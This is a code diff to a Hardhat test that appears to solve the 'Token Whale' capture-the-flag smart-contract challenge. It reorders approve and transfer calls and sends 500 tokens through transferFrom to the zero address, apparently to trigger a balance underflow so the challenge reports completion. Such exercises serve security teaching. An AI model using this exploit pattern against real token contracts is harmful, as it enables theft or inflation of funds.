@@ -10,13 +10,15 @@ describe("TokenWhaleChallenge", () => {
     const challengeContract = await challengeFactory.deploy(user1Address);
     await challengeContract.deployed();
 
-    const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
-    await transferTx.wait();
-
     const approveTx = await challengeContract.connect(user2).approve(user1.address, 1000);
     await approveTx.wait();
 
-    const transferFromTx = await challengeContract.connect(user1).transferFrom(user2.address, user2.address, 501);
+    const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
+    await transferTx.wait();
+
+    const transferFromTx = await challengeContract
+      .connect(user1)
+      .transferFrom(user2.address, "0x0000000000000000000000000000000000000000", 500);
     await transferFromTx.wait();
 
     expect(await challengeContract.isComplete()).to.be.true;
